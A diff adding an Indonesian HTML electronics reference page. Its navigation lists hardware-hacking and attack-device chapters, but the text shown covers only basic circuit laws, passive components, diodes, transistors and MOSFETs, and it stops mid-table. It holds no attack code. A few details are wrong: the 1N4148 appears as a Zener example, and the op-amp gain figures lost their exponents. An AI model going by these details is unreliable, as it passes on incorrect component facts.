@@ -1,0 +1,2382 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ELEKTRONIKA — Referensi Komprehensif</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,600;0,700;1,300&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c0f;
+    --bg2: #0f1215;
+    --bg3: #161b22;
+    --bg4: #1c2128;
+    --border: #21262d;
+    --border2: #30363d;
+    --green: #39d353;
+    --green2: #2ea043;
+    --green3: #56d364;
+    --cyan: #58a6ff;
+    --cyan2: #79c0ff;
+    --amber: #e3b341;
+    --amber2: #f0c96f;
+    --red: #f85149;
+    --purple: #bc8cff;
+    --text: #c9d1d9;
+    --text2: #8b949e;
+    --text3: #6e7681;
+    --heading: #f0f6fc;
+    --sidebar-w: 280px;
+    --code-bg: #0d1117;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'IBM Plex Sans', sans-serif;
+    font-size: 15px;
+    line-height: 1.75;
+    display: flex;
+  }
+
+  /* ── SIDEBAR ─────────────────────────────── */
+  #sidebar {
+    width: var(--sidebar-w);
+    min-height: 100vh;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    position: fixed;
+    top: 0; left: 0;
+    overflow-y: auto;
+    z-index: 100;
+    padding-bottom: 2rem;
+    transition: transform .3s ease;
+  }
+
+  #sidebar-header {
+    padding: 1.2rem 1rem;
+    border-bottom: 1px solid var(--border);
+    position: sticky; top: 0;
+    background: var(--bg2);
+    z-index: 2;
+  }
+
+  #sidebar-header .logo {
+    font-family: 'Space Mono', monospace;
+    font-size: .75rem;
+    color: var(--green);
+    letter-spacing: .15em;
+    text-transform: uppercase;
+    margin-bottom: .2rem;
+  }
+  #sidebar-header h2 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: .95rem;
+    color: var(--heading);
+    font-weight: 600;
+  }
+
+  .nav-group { margin: .4rem 0; }
+  .nav-group-label {
+    font-family: 'Space Mono', monospace;
+    font-size: .65rem;
+    color: var(--text3);
+    text-transform: uppercase;
+    letter-spacing: .12em;
+    padding: .6rem 1rem .25rem;
+  }
+  .nav-group a {
+    display: block;
+    padding: .28rem 1rem .28rem 1.5rem;
+    color: var(--text2);
+    text-decoration: none;
+    font-size: .82rem;
+    transition: color .15s, background .15s;
+    border-left: 2px solid transparent;
+  }
+  .nav-group a:hover,
+  .nav-group a.active {
+    color: var(--green3);
+    background: rgba(57,211,83,.06);
+    border-left-color: var(--green);
+  }
+
+  /* ── MAIN CONTENT ─────────────────────────── */
+  #main {
+    margin-left: var(--sidebar-w);
+    flex: 1;
+    min-height: 100vh;
+  }
+
+  /* hero */
+  #hero {
+    background: linear-gradient(135deg, #0a0c0f 0%, #0f1a10 50%, #0a0c0f 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 3.5rem 3rem 2.5rem;
+    position: relative;
+    overflow: hidden;
+  }
+  #hero::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: 
+      repeating-linear-gradient(0deg, transparent, transparent 30px, rgba(57,211,83,.03) 31px),
+      repeating-linear-gradient(90deg, transparent, transparent 60px, rgba(57,211,83,.03) 61px);
+  }
+  #hero .badge {
+    display: inline-block;
+    font-family: 'Space Mono', monospace;
+    font-size: .65rem;
+    letter-spacing: .18em;
+    text-transform: uppercase;
+    color: var(--green);
+    border: 1px solid var(--green2);
+    padding: .2rem .6rem;
+    border-radius: 2px;
+    margin-bottom: 1rem;
+    background: rgba(46,160,67,.08);
+  }
+  #hero h1 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 2.4rem;
+    font-weight: 600;
+    color: var(--heading);
+    line-height: 1.15;
+    margin-bottom: .8rem;
+    position: relative;
+  }
+  #hero h1 span { color: var(--green); }
+  #hero p {
+    color: var(--text2);
+    font-size: .9rem;
+    max-width: 600px;
+    position: relative;
+  }
+  .hero-stats {
+    display: flex;
+    gap: 2rem;
+    margin-top: 1.5rem;
+    flex-wrap: wrap;
+  }
+  .hero-stat {
+    font-family: 'Space Mono', monospace;
+    font-size: .75rem;
+    color: var(--text3);
+  }
+  .hero-stat strong { color: var(--amber); font-size: 1.1rem; display: block; }
+
+  /* article wrapper */
+  article {
+    padding: 0 3rem 4rem;
+    max-width: 900px;
+  }
+
+  /* sections */
+  .section {
+    padding-top: 3rem;
+    border-top: 1px solid var(--border);
+    margin-top: 3rem;
+  }
+  .section:first-of-type { border-top: none; margin-top: 1.5rem; }
+
+  .section-label {
+    font-family: 'Space Mono', monospace;
+    font-size: .62rem;
+    letter-spacing: .2em;
+    text-transform: uppercase;
+    color: var(--green);
+    margin-bottom: .5rem;
+  }
+
+  h2.section-title {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: 1.6rem;
+    font-weight: 600;
+    color: var(--heading);
+    margin-bottom: 1rem;
+    line-height: 1.2;
+  }
+
+  h3 {
+    font-family: 'IBM Plex Sans', sans-serif;
+    font-size: 1.05rem;
+    font-weight: 600;
+    color: var(--cyan2);
+    margin: 1.8rem 0 .6rem;
+  }
+
+  h4 {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: .88rem;
+    font-weight: 500;
+    color: var(--amber2);
+    margin: 1.2rem 0 .4rem;
+  }
+
+  p { margin-bottom: .85rem; color: var(--text); }
+  p:last-child { margin-bottom: 0; }
+
+  strong { color: var(--heading); font-weight: 600; }
+  em { color: var(--amber); font-style: normal; }
+
+  a { color: var(--cyan); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* ── CODE BLOCKS ──────────────────────────── */
+  code {
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: .82em;
+    background: var(--bg3);
+    color: var(--green3);
+    padding: .1em .35em;
+    border-radius: 3px;
+    border: 1px solid var(--border);
+  }
+
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    padding: 1.1rem 1.3rem;
+    overflow-x: auto;
+    margin: 1rem 0;
+    position: relative;
+  }
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    font-size: .83rem;
+    color: var(--text);
+    line-height: 1.7;
+  }
+  pre .kw { color: #ff7b72; }
+  pre .fn { color: var(--purple); }
+  pre .str { color: var(--amber); }
+  pre .cm { color: var(--text3); font-style: italic; }
+  pre .num { color: var(--green3); }
+  pre .var { color: var(--cyan2); }
+  pre .label { color: var(--amber2); }
+
+  /* ── TABLES ───────────────────────────────── */
+  .tbl-wrap { overflow-x: auto; margin: 1rem 0; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: .83rem;
+  }
+  thead tr {
+    background: var(--bg3);
+    border-bottom: 2px solid var(--green2);
+  }
+  th {
+    font-family: 'Space Mono', monospace;
+    font-size: .68rem;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    color: var(--green);
+    padding: .6rem .8rem;
+    text-align: left;
+  }
+  td {
+    padding: .55rem .8rem;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+    color: var(--text);
+  }
+  tr:hover td { background: rgba(255,255,255,.02); }
+  td code { font-size: .78rem; }
+
+  /* ── CALLOUTS ─────────────────────────────── */
+  .callout {
+    border-left: 3px solid;
+    padding: .8rem 1rem;
+    margin: 1.2rem 0;
+    border-radius: 0 4px 4px 0;
+    font-size: .87rem;
+  }
+  .callout.tip  { border-color: var(--green); background: rgba(57,211,83,.05); }
+  .callout.warn { border-color: var(--amber); background: rgba(227,179,65,.05); }
+  .callout.danger { border-color: var(--red); background: rgba(248,81,73,.05); }
+  .callout.info { border-color: var(--cyan); background: rgba(88,166,255,.05); }
+  .callout-title {
+    font-family: 'Space Mono', monospace;
+    font-size: .68rem;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    margin-bottom: .3rem;
+    font-weight: 700;
+  }
+  .callout.tip .callout-title  { color: var(--green); }
+  .callout.warn .callout-title { color: var(--amber); }
+  .callout.danger .callout-title { color: var(--red); }
+  .callout.info .callout-title  { color: var(--cyan); }
+
+  /* ── CARDS / GRID ──────────────────────────── */
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+    gap: .8rem;
+    margin: 1rem 0;
+  }
+  .card {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: .9rem;
+    transition: border-color .2s;
+  }
+  .card:hover { border-color: var(--border2); }
+  .card .card-head {
+    font-family: 'Space Mono', monospace;
+    font-size: .72rem;
+    color: var(--green);
+    text-transform: uppercase;
+    letter-spacing: .1em;
+    margin-bottom: .4rem;
+  }
+  .card .card-name {
+    font-weight: 600;
+    color: var(--heading);
+    font-size: .9rem;
+    margin-bottom: .3rem;
+  }
+  .card p {
+    font-size: .78rem;
+    color: var(--text2);
+    margin: 0;
+  }
+
+  /* formula */
+  .formula {
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 4px;
+    padding: .7rem 1rem;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: .88rem;
+    color: var(--amber2);
+    margin: .8rem 0;
+    display: inline-block;
+  }
+
+  /* two-col */
+  .cols2 {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1rem;
+    margin: 1rem 0;
+  }
+  @media(max-width:600px) { .cols2 { grid-template-columns: 1fr; } }
+
+  /* ── TAG/BADGE ──────────────────────────────── */
+  .tag {
+    display: inline-block;
+    font-family: 'Space Mono', monospace;
+    font-size: .62rem;
+    padding: .1rem .45rem;
+    border-radius: 2px;
+    text-transform: uppercase;
+    letter-spacing: .08em;
+    margin: .1rem;
+  }
+  .tag.green { background: rgba(57,211,83,.15); color: var(--green3); border: 1px solid rgba(57,211,83,.3); }
+  .tag.cyan  { background: rgba(88,166,255,.12); color: var(--cyan2); border: 1px solid rgba(88,166,255,.25); }
+  .tag.amber { background: rgba(227,179,65,.12); color: var(--amber2); border: 1px solid rgba(227,179,65,.25); }
+  .tag.red   { background: rgba(248,81,73,.12); color: var(--red); border: 1px solid rgba(248,81,73,.25); }
+  .tag.purple{ background: rgba(188,140,255,.12); color: var(--purple); border: 1px solid rgba(188,140,255,.25); }
+
+  /* pin diagram */
+  .pin-diagram {
+    background: var(--bg4);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    padding: 1rem;
+    font-family: 'IBM Plex Mono', monospace;
+    font-size: .78rem;
+    line-height: 2;
+    color: var(--text2);
+    margin: 1rem 0;
+  }
+  .pin-diagram .pin-name { color: var(--cyan2); }
+  .pin-diagram .pin-num  { color: var(--green); }
+
+  /* ── MOBILE HAMBURGER ─────────────────────── */
+  #hamburger {
+    display: none;
+    position: fixed;
+    top: .8rem; left: .8rem;
+    z-index: 200;
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 4px;
+    padding: .4rem .55rem;
+    cursor: pointer;
+    flex-direction: column;
+    gap: 4px;
+  }
+  #hamburger span {
+    display: block;
+    width: 18px; height: 2px;
+    background: var(--green);
+    transition: .2s;
+  }
+
+  .toc-section { margin: 0; padding: 1rem; border-bottom: 1px solid var(--border); }
+  .toc-section ol { padding-left: 1.2rem; color: var(--text2); font-size: .84rem; }
+  .toc-section li { padding: .15rem 0; }
+  .toc-section li a { color: var(--text2); }
+  .toc-section li a:hover { color: var(--green3); }
+
+  @media(max-width: 900px) {
+    #hamburger { display: flex; }
+    #sidebar {
+      transform: translateX(-100%);
+    }
+    #sidebar.open {
+      transform: translateX(0);
+    }
+    #main { margin-left: 0; }
+    article { padding: 1rem 1.2rem 3rem; }
+    #hero { padding: 3rem 1.2rem 2rem; }
+    #hero h1 { font-size: 1.6rem; }
+    .card-grid { grid-template-columns: 1fr 1fr; }
+  }
+  @media(max-width:480px) {
+    .card-grid { grid-template-columns: 1fr; }
+  }
+
+  /* scrollbar */
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
+
+  ul, ol { padding-left: 1.4rem; margin-bottom: .85rem; }
+  li { margin-bottom: .25rem; }
+  hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+
+  .mono { font-family: 'IBM Plex Mono', monospace; }
+</style>
+</head>
+<body>
+
+<!-- Hamburger -->
+<button id="hamburger" aria-label="Menu" onclick="toggleSidebar()">
+  <span></span><span></span><span></span>
+</button>
+
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div id="sidebar-header">
+    <div class="logo">Blue Dragon Ref v1.0</div>
+    <h2>ELEKTRONIKA</h2>
+  </div>
+
+  <div class="nav-group">
+    <div class="nav-group-label">Dasar</div>
+    <a href="#dasar">Konsep & Hukum Dasar</a>
+    <a href="#komponen-pasif">Komponen Pasif</a>
+    <a href="#semikonduktor">Semikonduktor & IC</a>
+    <a href="#digital">Elektronika Digital</a>
+  </div>
+  <div class="nav-group">
+    <div class="nav-group-label">Embedded & MCU</div>
+    <a href="#mcu">Mikrokontroler & SoC</a>
+    <a href="#protokol">Protokol Komunikasi</a>
+    <a href="#rf">RF & Wireless</a>
+  </div>
+  <div class="nav-group">
+    <div class="nav-group-label">PCB & Manufaktur</div>
+    <a href="#pcb-design">Desain PCB</a>
+    <a href="#pcb-layer">Layer & Stackup</a>
+    <a href="#pcb-fab">Fabrikasi & Assembly</a>
+    <a href="#komponen-sourcing">BOM & Sourcing</a>
+  </div>
+  <div class="nav-group">
+    <div class="nav-group-label">Hardware Hacking</div>
+    <a href="#hw-recon">Recon & Reverse PCB</a>
+    <a href="#jtag-swd">JTAG & SWD Debug</a>
+    <a href="#uart-console">UART / Serial Console</a>
+    <a href="#flash-dump">SPI Flash & I2C Dump</a>
+    <a href="#fault-injection">Fault Injection & Glitch</a>
+    <a href="#side-channel">Side-Channel Analysis</a>
+  </div>
+  <div class="nav-group">
+    <div class="nav-group-label">Produk Hacking</div>
+    <a href="#bad-usb">Bad USB / HID Attack</a>
+    <a href="#wifi-attack">WiFi Attack Hardware</a>
+    <a href="#sdr-sigint">SDR & SIGINT</a>
+    <a href="#flipper">Flipper-Class Devices</a>
+    <a href="#implant">Implant & Covert Hardware</a>
+  </div>
+  <div class="nav-group">
+    <div class="nav-group-label">Robotika</div>
+    <a href="#motor">Motor & Aktuator</a>
+    <a href="#sensor">Sensor & Persepsi</a>
+    <a href="#control">Kontrol & PID</a>
+    <a href="#power">Power Supply & Baterai</a>
+  </div>
+  <div class="nav-group">
+    <div class="nav-group-label">Alat & Lab</div>
+    <a href="#tools">Peralatan Lab</a>
+    <a href="#soldering">Soldering & Rework</a>
+  </div>
+</nav>
+
+<!-- MAIN -->
+<div id="main">
+
+<div id="hero">
+  <div class="badge">Referensi Komprehensif</div>
+  <h1>ELEKTRONIKA<br><span>Hardware · PCB · Hacking</span></h1>
+  <p>Bahan bacaan untuk refresher mendalam — mencakup dasar elektronika analog/digital, desain PCB profesional, hardware hacking & offensive security, manufaktur produk perangkat hacking, dan robotika.</p>
+  <div class="hero-stats">
+    <div class="hero-stat"><strong>13</strong> Bab Utama</div>
+    <div class="hero-stat"><strong>50+</strong> Sub-Topik</div>
+    <div class="hero-stat"><strong>100+</strong> Tabel & Formula</div>
+  </div>
+</div>
+
+<article>
+
+<!-- ════════════════════════════════════════════
+     1. KONSEP & HUKUM DASAR
+═════════════════════════════════════════════ -->
+<div class="section" id="dasar">
+  <div class="section-label">§ 01 — Dasar Elektronika</div>
+  <h2 class="section-title">Konsep & Hukum Dasar</h2>
+
+  <p>Elektronika adalah ilmu yang mempelajari kontrol aliran elektron dalam material konduktor dan semikonduktor untuk memproses informasi atau energi. Semua perangkat keras — dari sensor IoT hingga firmware exploit platform — berakar pada prinsip-prinsip berikut.</p>
+
+  <h3>Besaran Dasar Listrik</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Besaran</th><th>Simbol</th><th>Satuan</th><th>Definisi</th></tr></thead>
+    <tbody>
+      <tr><td>Tegangan</td><td><code>V</code></td><td>Volt (V)</td><td>Beda potensial antara dua titik — "tekanan" yang mendorong arus</td></tr>
+      <tr><td>Arus</td><td><code>I</code></td><td>Ampere (A)</td><td>Laju aliran muatan listrik (Coulomb/detik)</td></tr>
+      <tr><td>Resistansi</td><td><code>R</code></td><td>Ohm (Ω)</td><td>Hambatan terhadap aliran arus</td></tr>
+      <tr><td>Kapasitansi</td><td><code>C</code></td><td>Farad (F)</td><td>Kemampuan menyimpan muatan</td></tr>
+      <tr><td>Induktansi</td><td><code>L</code></td><td>Henry (H)</td><td>Kemampuan menyimpan energi medan magnet</td></tr>
+      <tr><td>Daya</td><td><code>P</code></td><td>Watt (W)</td><td>Laju transfer energi</td></tr>
+      <tr><td>Frekuensi</td><td><code>f</code></td><td>Hertz (Hz)</td><td>Jumlah siklus per detik</td></tr>
+      <tr><td>Impedansi</td><td><code>Z</code></td><td>Ohm (Ω)</td><td>Resistansi total termasuk reaktansi (AC)</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Hukum Ohm</h3>
+  <p>Fondasi analisis rangkaian DC sederhana:</p>
+  <div class="formula">V = I × R &nbsp;|&nbsp; I = V/R &nbsp;|&nbsp; R = V/I</div>
+  <div class="formula">P = V × I = I²R = V²/R</div>
+
+  <h3>Hukum Kirchhoff</h3>
+  <h4>KCL — Kirchhoff's Current Law</h4>
+  <p>Jumlah arus masuk ke sebuah node = jumlah arus keluar. Arus tidak dapat "hilang" di node.</p>
+  <div class="formula">ΣI_masuk = ΣI_keluar</div>
+
+  <h4>KVL — Kirchhoff's Voltage Law</h4>
+  <p>Jumlah aljabar tegangan dalam loop tertutup = 0.</p>
+  <div class="formula">ΣV_loop = 0</div>
+
+  <h3>Rangkaian Seri vs Paralel</h3>
+  <div class="cols2">
+    <div>
+      <h4>Resistor Seri</h4>
+      <div class="formula">R_total = R1 + R2 + ... + Rn</div>
+      <p>Arus sama di semua komponen. Tegangan terbagi.</p>
+    </div>
+    <div>
+      <h4>Resistor Paralel</h4>
+      <div class="formula">1/R_total = 1/R1 + 1/R2 + ... + 1/Rn</div>
+      <p>Tegangan sama di semua komponen. Arus terbagi.</p>
+    </div>
+  </div>
+
+  <h3>Thevenin & Norton</h3>
+  <p>Dua teorema yang memungkinkan menyederhanakan jaringan kompleks menjadi model sederhana:</p>
+  <ul>
+    <li><strong>Thevenin:</strong> Sumber tegangan <code>V_th</code> + resistansi <code>R_th</code> seri</li>
+    <li><strong>Norton:</strong> Sumber arus <code>I_N</code> + resistansi <code>R_N</code> paralel</li>
+    <li>Hubungan: <code>V_th = I_N × R_N</code>, <code>R_th = R_N</code></li>
+  </ul>
+
+  <h3>Analisis AC — Impedansi & Reaktansi</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Komponen</th><th>Impedansi</th><th>Behavior</th></tr></thead>
+    <tbody>
+      <tr><td>Resistor</td><td><code>Z = R</code></td><td>Tidak frekuensi-dependen</td></tr>
+      <tr><td>Kapasitor</td><td><code>Z_C = 1/(jωC)</code></td><td>Impedansi ↑ saat frekuensi ↓ — blokir DC, loloskan AC</td></tr>
+      <tr><td>Induktor</td><td><code>Z_L = jωL</code></td><td>Impedansi ↑ saat frekuensi ↑ — loloskan DC, blokir AC</td></tr>
+    </tbody>
+  </table></div>
+  <p>Di mana <code>ω = 2πf</code> (frekuensi sudut, rad/s).</p>
+
+  <h3>Filter RC Dasar</h3>
+  <div class="cols2">
+    <div>
+      <h4>Low-Pass Filter (LPF)</h4>
+      <p>Resistor di jalur sinyal, kapasitor ke ground. Frekuensi cutoff: <code>f_c = 1/(2πRC)</code>. Loloskan sinyal di bawah <code>f_c</code>, attenuasi di atas.</p>
+    </div>
+    <div>
+      <h4>High-Pass Filter (HPF)</h4>
+      <p>Kapasitor di jalur sinyal, resistor ke ground. Frekuensi cutoff sama. Loloskan sinyal di atas <code>f_c</code>, attenuasi di bawah.</p>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <div class="callout-title">💡 Relevansi Hardware Hacking</div>
+    Filter RC krusial untuk bypass EMI, decoupling power rail, dan memahami sinyal saat sniffing protokol serial. Filter LC digunakan di power supply switching — penting saat fault injection.
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     2. KOMPONEN PASIF
+═════════════════════════════════════════════ -->
+<div class="section" id="komponen-pasif">
+  <div class="section-label">§ 02 — Komponen Pasif</div>
+  <h2 class="section-title">Resistor, Kapasitor & Induktor</h2>
+
+  <h3>Resistor</h3>
+  <p>Komponen paling fundamental — membatasi arus dan membagi tegangan. Tersedia dalam package THT (through-hole) dan SMD.</p>
+
+  <h4>Kode Warna Resistor THT</h4>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Warna</th><th>Digit</th><th>Multiplier</th><th>Toleransi</th></tr></thead>
+    <tbody>
+      <tr><td>Hitam</td><td>0</td><td>×1</td><td>—</td></tr>
+      <tr><td>Coklat</td><td>1</td><td>×10</td><td>±1%</td></tr>
+      <tr><td>Merah</td><td>2</td><td>×100</td><td>±2%</td></tr>
+      <tr><td>Oranye</td><td>3</td><td>×1K</td><td>—</td></tr>
+      <tr><td>Kuning</td><td>4</td><td>×10K</td><td>—</td></tr>
+      <tr><td>Hijau</td><td>5</td><td>×100K</td><td>±0.5%</td></tr>
+      <tr><td>Biru</td><td>6</td><td>×1M</td><td>±0.25%</td></tr>
+      <tr><td>Ungu</td><td>7</td><td>×10M</td><td>±0.1%</td></tr>
+      <tr><td>Abu-abu</td><td>8</td><td>—</td><td>±0.05%</td></tr>
+      <tr><td>Putih</td><td>9</td><td>—</td><td>—</td></tr>
+      <tr><td>Emas</td><td>—</td><td>×0.1</td><td>±5%</td></tr>
+      <tr><td>Perak</td><td>—</td><td>×0.01</td><td>±10%</td></tr>
+    </tbody>
+  </table></div>
+
+  <h4>Package SMD — Kode EIA</h4>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Package</th><th>Dimensi (inci)</th><th>Dimensi (mm)</th><th>Power Rating Tipikal</th></tr></thead>
+    <tbody>
+      <tr><td>0402</td><td>0.04×0.02"</td><td>1.0×0.5 mm</td><td>62.5 mW</td></tr>
+      <tr><td>0603</td><td>0.06×0.03"</td><td>1.6×0.8 mm</td><td>100 mW</td></tr>
+      <tr><td>0805</td><td>0.08×0.05"</td><td>2.0×1.25 mm</td><td>125 mW</td></tr>
+      <tr><td>1206</td><td>0.12×0.06"</td><td>3.2×1.6 mm</td><td>250 mW</td></tr>
+      <tr><td>2512</td><td>0.25×0.12"</td><td>6.3×3.2 mm</td><td>1 W</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Kapasitor</h3>
+  <p>Menyimpan dan melepas energi dalam medan listrik. Tiga jenis utama yang perlu dikuasai:</p>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Jenis</th><th>Range</th><th>Voltase Max</th><th>Keunggulan</th><th>Kelemahan</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Elektrolit (Al)</strong></td><td>1µF–100mF</td><td>6.3–450V</td><td>Kapasitansi besar, murah</td><td>Polar, ESR tinggi, lifetime terbatas</td></tr>
+      <tr><td><strong>Keramik (MLCC)</strong></td><td>1pF–100µF</td><td>4–250V</td><td>ESR rendah, non-polar, kecil</td><td>Kapasitansi berubah dengan voltage (X5R/X7R)</td></tr>
+      <tr><td><strong>Tantalum</strong></td><td>100nF–1mF</td><td>2.5–50V</td><td>Stabil, ESR rendah</td><td>Mahal, bisa meledak jika reverse-bias</td></tr>
+    </tbody>
+  </table></div>
+
+  <h4>Decoupling Capacitor</h4>
+  <p>Setiap IC <strong>wajib</strong> punya decoupling cap 100nF (0.1µF) keramik sedekat mungkin ke pin VCC. Fungsi: menyaring noise power supply, menyediakan burst current saat switching.</p>
+  <pre><code><span class="cm">/* Aturan decoupling praktis */</span>
+<span class="cm">- 100nF MLCC: tiap IC, sedekat mungkin ke pin VCC</span>
+<span class="cm">- 10µF MLCC/tantalum: tiap subsistem (MCU, modul RF, dll)</span>
+<span class="cm">- 100µF+ elektrolit: di input/output regulator</span>
+<span class="cm">- Seri ESR vs kapasitansi: C_bypass = I_transient / (ΔV × f_switch)</span></code></pre>
+
+  <h3>Induktor & Transformator</h3>
+  <p>Induktor menyimpan energi dalam medan magnet. Kritikal di:</p>
+  <ul>
+    <li><strong>Buck/boost converter</strong> — komponen switching utama</li>
+    <li><strong>Ferrite bead</strong> — filter EMI pada jalur power (impedansi tinggi di frekuensi tinggi)</li>
+    <li><strong>Common-mode choke</strong> — filter noise common-mode di USB, Ethernet</li>
+    <li><strong>RF choke</strong> — blokir RF masuk ke power supply</li>
+  </ul>
+
+  <div class="callout warn">
+    <div class="callout-title">⚠ Perhatian Desain</div>
+    Jangan anggap remeh placement capacitor decoupling. Trace panjang antara IC dan decoupling cap = induktansi parasitik = filter tidak bekerja optimal. Di frekuensi tinggi (&gt;100MHz), letak fisik lebih penting dari nilai kapasitansi.
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     3. SEMIKONDUKTOR & IC
+═════════════════════════════════════════════ -->
+<div class="section" id="semikonduktor">
+  <div class="section-label">§ 03 — Semikonduktor</div>
+  <h2 class="section-title">Semikonduktor & IC Analog</h2>
+
+  <h3>Dioda</h3>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Tipe</th><th>Vf Tipikal</th><th>Kegunaan</th><th>Part Contoh</th></tr></thead>
+    <tbody>
+      <tr><td>Si Rectifier</td><td>0.6–0.7V</td><td>Rectifier, proteksi polarity</td><td>1N4001–1N4007</td></tr>
+      <tr><td>Schottky</td><td>0.2–0.4V</td><td>Power supply switching, OR-ing</td><td>BAT43, SS14, MBRS340</td></tr>
+      <tr><td>Zener</td><td>Vz (fixed)</td><td>Voltage reference, clamp proteksi</td><td>BZX55, 1N4148</td></tr>
+      <tr><td>LED</td><td>1.8–3.5V</td><td>Indicator, optocoupler</td><td>Berbagai warna</td></tr>
+      <tr><td>TVS</td><td>—</td><td>ESD protection, surge protection</td><td>SMAJ5.0A, PESD5V0</td></tr>
+      <tr><td>Tunnel</td><td>Negatif diff</td><td>Osilator frekuensi sangat tinggi</td><td>—</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Transistor BJT</h3>
+  <p>Bipolar Junction Transistor — tiga terminal: Base, Collector, Emitter. Dua tipe: NPN dan PNP.</p>
+  <div class="formula">I_C = β × I_B &nbsp;|&nbsp; β (hFE) = 20–500 (tipikal)</div>
+  <p><strong>Mode operasi:</strong></p>
+  <ul>
+    <li><em>Cut-off:</em> I_B = 0, transistor OFF. Gunakan sebagai switch OFF.</li>
+    <li><em>Saturasi:</em> V_CE ≈ 0.2V, transistor ON penuh. Gunakan sebagai switch ON.</li>
+    <li><em>Aktif:</em> I_C = β×I_B, gunakan sebagai amplifier.</li>
+  </ul>
+
+  <h4>Contoh Driver LED / Relay dengan BJT NPN (misal 2N2222, BC547)</h4>
+  <pre><code><span class="cm">/* Resistor basis: R_B = (V_logic - V_BE) / I_B_sat */</span>
+<span class="cm">/* I_B_sat = I_C / β × 10 (faktor saturasi 10) */</span>
+<span class="var">V_logic</span> = <span class="num">3.3</span>V, <span class="var">V_BE</span> = <span class="num">0.7</span>V, <span class="var">I_C</span> = <span class="num">100</span>mA, β = <span class="num">100</span>
+<span class="var">I_B_sat</span> = (<span class="num">100</span>mA / <span class="num">100</span>) × <span class="num">10</span> = <span class="num">10</span>mA
+<span class="var">R_B</span> = (<span class="num">3.3</span> - <span class="num">0.7</span>) / <span class="num">0.01</span> = <span class="num">260</span>Ω → gunakan <span class="num">220</span>Ω</code></pre>
+
+  <h3>MOSFET</h3>
+  <p>Metal-Oxide-Semiconductor FET — dikendalikan tegangan (Gate), bukan arus. Jauh lebih efisien untuk switching daya. Terminal: Gate (G), Drain (D), Source (S).</p>
+  <div class="tbl-wrap"><table>
+    <thead><tr><th>Parameter</th><th>Penjelasan</th><th>Relevansi Desain</th></tr></thead>
+    <tbody>
+      <tr><td>V_GS(th)</td><td>Threshold gate voltage — minimal untuk konduksi</td><td>Pastikan logic level cukup untuk drive MOSFET (3.3V logic → pilih MOSFET V_th ≤2V)</td></tr>
+      <tr><td>R_DS(on)</td><td>Resistansi drain-source saat ON</td><td>Memengaruhi disipasi panas: P = I²×R_DS(on)</td></tr>
+      <tr><td>Q_g</td><td>Gate charge total</td><td>Menentukan kecepatan switching dan driver current yang dibutuhkan</td></tr>
+      <tr><td>V_DS(max)</td><td>Maks tegangan drain-source</td><td>Pilih minimal 20% headroom dari V_supply</td></tr>
+      <tr><td>I_D(max)</td><td>Maks arus drain</td><td>Pilih minimal 2× dari arus operasi</td></tr>
+    </tbody>
+  </table></div>
+
+  <h4>MOSFET sebagai High-Side Switch</h4>
+  <p>Untuk switch N-Channel high-side, butuh gate voltage > V_source + V_th → perlu <em>bootstrap circuit</em> atau gate driver IC. Alternatif: P-Channel MOSFET (lebih mudah drive tapi R_DS(on) lebih tinggi).</p>
+
+  <h3>Op-Amp (Operational Amplifier)</h3>
+  <p>IC analog serbaguna. Input differensial (+, -), satu output. Aturan dasar:</p>
+  <ul>
+    <li>Input impedansi sangat tinggi (teoritis ∞)</li>
+    <li>Output impedansi sangat rendah (teoritis 0)</li>
+    <li>Open-loop gain sangat besar (105 – 106)</li>
+  </ul>
+  <h4>Konfigurasi Umum</h4>
+  <div class="tbl-wrap"><table>
